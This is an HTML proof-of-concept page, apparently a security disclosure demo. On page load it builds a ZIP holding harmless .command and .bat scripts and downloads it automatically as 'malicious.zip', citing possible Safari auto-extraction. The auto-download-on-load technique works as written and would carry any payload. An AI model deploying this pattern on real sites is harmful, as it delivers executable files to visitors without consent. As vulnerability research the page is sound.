<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Auto-Download PoC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
</head>
<body>
    <h2>Security Vulnerability Demo</h2>
    <p>This PoC downloads a harmless ZIP to show a risk.</p>
    <p>Manual download: <a id="manual-download" href="#">Click here</a>.</p>
    
    <script>
        window.onload = function() {
            let zip = new JSZip();
            
            // Add a macOS script (harmless)
            zip.file("alert.command", "#!/bin/bash\nosascript -e 'display alert \"PoC: Your device could be compromised.\"'");
            
            // Add a Windows batch file (harmless)
            zip.file("warning.bat", "@echo off\necho This could have been malware!\npause");
            
            // Add explanation
            zip.file("README.txt", "This ZIP auto-downloaded. In Safari, it may auto-extract and run, showing a security flaw.");
            
            // Generate ZIP and trigger download
            zip.generateAsync({ type: "blob" }).then(function(blob) {
                let url = URL.createObjectURL(blob);
                let link = document.createElement("a");
                link.href = url;
                link.download = "malicious.zip";
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // Manual fallback
                document.getElementById("manual-download").href = url;
            });
        };
    </script>
</body>
</html>
